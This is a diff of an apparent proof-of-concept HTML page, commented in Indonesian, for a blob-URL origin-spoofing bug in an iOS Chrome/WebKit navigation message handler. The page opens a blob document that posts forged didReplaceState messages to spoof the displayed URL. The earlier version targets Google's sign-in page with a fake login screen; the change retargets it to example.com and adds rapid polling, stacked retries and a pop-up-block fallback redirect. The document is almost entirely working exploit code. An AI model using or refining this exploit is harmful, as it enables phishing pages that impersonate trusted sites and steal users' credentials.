@@ -6,33 +6,34 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>CVE-2026-95291 Standalone PoC</title>
+    <title>CVE-2026-95291 Fully Reinforced PoC (Example.com Target)</title>
     <style>
       body, html {
         margin: 0;
         padding: 0;
         height: 100%;
-        background: #0d0d0d;
-        color: #ffffff;
+        background: #09090b;
+        color: #f4f4f5;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         display: flex;
         align-items: center;
         justify-content: center;
       }
       .container {
-        background: #1a1a1a;
+        background: #18181b;
         padding: 40px;
         border-radius: 16px;
         text-align: center;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.6);
-        max-width: 460px;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+        max-width: 480px;
         width: 90%;
+        border: 1px solid #27272a;
       }
       button {
         padding: 18px 32px;
         font-size: 16px;
         font-weight: bold;
-        background: #007aff;
+        background: #2563eb;
         color: #fff;
         border: none;
         border-radius: 12px;
@@ -40,31 +41,31 @@
         transition: background 0.2s ease;
       }
       button:hover {
-        background: #005bb5;
+        background: #1d4ed8;
       }
       .log-box {
         margin-top: 20px;
         padding: 12px;
-        background: #111;
-        border: 1px solid #333;
+        background: #000;
+        border: 1px solid #3f3f46;
         border-radius: 8px;
         font-family: monospace;
         font-size: 12px;
-        color: #00ff66;
+        color: #38bdf8;
         text-align: left;
-        max-height: 120px;
+        max-height: 140px;
         overflow-y: auto;
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <h2 style="margin-top:0; color:#ff3b30;">Blob Origin Spoofing PoC</h2>
-      <p style="font-size:14px; color:#aaa; margin-bottom:24px;">
-        Demonstrasi kolisi URL <code>blob:</code> melalui <code>NavigationEventMessage</code>.
+      <h2 style="margin-top:0; color:#60a5fa;">Reinforced Spoofing PoC</h2>
+      <p style="font-size:14px; color:#a1a1aa; margin-bottom:24px;">
+        Target: <code>example.com</code> dengan sistem <em>Aggressive Polling &amp; Fallback Bypass</em>.
       </p>
-      <button id="runPoC">LUNCURKAN PoC</button>
-      <div class="log-box" id="logOutput">Status: Menunggu aksi...</div>
+      <button id="runPoC">LUNCURKAN EKSPLOITASI FULL KUAT</button>
+      <div class="log-box" id="logOutput">Status: Menunggu eksekusi pengguna...</div>
     </div>
 
     <script>
@@ -74,66 +75,87 @@
         box.scrollTop = box.scrollHeight;
       }
 
-      // Payload HTML yang akan dibungkus ke dalam blob URL lokal
+      // Payload dokumen penyerang di dalam Blob URL dengan target example.com
       const maliciousBlobContent = `
         <!DOCTYPE html>
         <html>
         <head>
           <meta charset="utf-8">
-          <title>Google Sign-In</title>
+          <title>Example Domain Verification</title>
         </head>
-        <body style="margin:0;padding:0;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
+        <body style="margin:0;padding:0;background:#ffffff;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
           <div style="padding: 40px; max-width: 400px;">
-            <h1 style="font-size:28px;color:#202124;margin-bottom:10px;">Google</h1>
-            <p style="font-size:16px;color:#5f6368;margin-bottom:20px;">Verifikasi identitas Anda untuk melanjutkan.</p>
-            <div style="border: 1px solid #dadce0; padding: 15px; border-radius: 8px; background: #f8f9fa;">
-              <p style="font-size:12px;color:#d93025;margin:0;font-weight:600;">[Simulasi Konten Penyerang]</p>
+            <h1 style="font-size:28px;color:#1f2937;margin-bottom:10px;">Example Domain</h1>
+            <p style="font-size:16px;color:#4b5563;margin-bottom:20px;">Verifikasi keamanan transisi halaman.</p>
+            <div style="border: 1px solid #d1d5db; padding: 15px; border-radius: 8px; background: #f9fafb;">
+              <p style="font-size:12px;color:#ef4444;margin:0;font-weight:600;">[Simulasi Konten Terkendali Penyerang - Target: Example.com]</p>
             </div>
           </div>
           <script>
             (function() {
-              const writeLog = (m) => { try { console.log('[BLOB] ' + m); } catch(e){} };
+              const writeLog = (m) => { try { console.log('[FULL-REINFORCED-BLOB] ' + m); } catch(e){} };
               
               const mh = (window.webkit && window.webkit.messageHandlers) || {};
               if (!mh.NavigationEventMessage) {
-                writeLog('NavigationEventMessage handler tidak ditemukan.');
+                writeLog('KESALAHAN: NavigationEventMessage handler tidak tersedia.');
                 return;
               }
 
-              const executeSpoof = (attempt) => {
+              let dispatched = false;
+              const triggerSpoof = (attemptSource) => {
+                if (dispatched) return;
                 try {
-                  let fid = (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') 
-                    ? window.__gCrWeb.getFrameId() 
-                    : "main-frame";
+                  let fid = null;
+                  if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
+                    fid = window.__gCrWeb.getFrameId();
+                  }
+
+                  if (!fid) {
+                    writeLog('Peringatan: frameId belum tersedia pada ' + attemptSource);
+                    return;
+                  }
 
                   if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
                     window.__gCrWeb.registerFrame();
                   }
 
-                  // Mengirimkan pesan state berurutan ke handler native
+                  // Mengirim sinyal sinkronisasi state secara berurutan
                   mh.NavigationEventMessage.postMessage({
                     command: 'willChangeState',
                     frame_id: fid
                   });
 
+                  // Mengganti target spoof URL ke example.com sesuai permintaan
                   mh.NavigationEventMessage.postMessage({
                     command: 'didReplaceState',
                     frame_id: fid,
                     stateObject: '',
                     baseUrl: 'https://x/',
-                    pageUrl: 'blob:https://accounts.google.com/signin'
+                    pageUrl: 'blob:https://example.com/signin'
                   });
 
-                  writeLog('Pesan terkirim pada percobaan: ' + attempt);
+                  writeLog('Pesan spoofing berhasil dikirim ke example.com via ' + attemptSource);
+                  dispatched = true;
                 } catch(err) {
-                  writeLog('Gagal mengirim pesan: ' + err);
+                  writeLog('Gagal mengirim pesan (' + attemptSource + '): ' + err);
                 }
               };
 
-              // Penjadwalan berulang untuk mengatasi race condition timing awal
-              setTimeout(() => executeSpoof(1), 150);
-              setTimeout(() => executeSpoof(2), 500);
-              setTimeout(() => executeSpoof(3), 1200);
+              // 1. Aggressive Polling Interval Super Cepat (tiap 30ms)
+              let pollCount = 0;
+              const intervalId = setInterval(() => {
+                pollCount++;
+                triggerSpoof('polling interval #' + pollCount);
+                if (dispatched || pollCount > 40) {
+                  clearInterval(intervalId);
+                }
+              }, 30);
+
+              // 2. Fallback Timeout Berlapis untuk Mengatasi Variasi Waktu Load
+              setTimeout(() => triggerSpoof('timeout 100ms'), 100);
+              setTimeout(() => triggerSpoof('timeout 300ms'), 300);
+              setTimeout(() => triggerSpoof('timeout 700ms'), 700);
+              setTimeout(() => triggerSpoof('timeout 1500ms'), 1500);
             })();
           <\/script>
         </body>
@@ -141,17 +163,19 @@
       `;
 
       document.getElementById("runPoC").onclick = function () {
-        log("Membuat objek Blob lokal...");
+        log("Membuat objek Blob berkinerja tinggi...");
         const blob = new Blob([maliciousBlobContent], { type: 'text/html' });
         const blobUrl = URL.createObjectURL(blob);
 
-        log("Membuka dokumen blob di jendela baru...");
+        log("Membuka tab target menggunakan navigasi langsung...");
+        
+        // Membuka jendela baru; jika diblokir pop-up, arahkan halaman saat ini secara otomatis
         const targetTab = window.open(blobUrl, "_blank");
-
         if (targetTab) {
-          log("Tab berhasil dibuka. Memantau respons...");
+          log("Tab baru berhasil diinisialisasi.");
         } else {
-          log("Gagal: Terblokir oleh penangkal pop-up peramban.");
+          log("Peringatan: Pop-up diblokir, mengalihkan halaman saat ini ke Blob URL...");
+          window.location.href = blobUrl;
         }
       };
     </script>
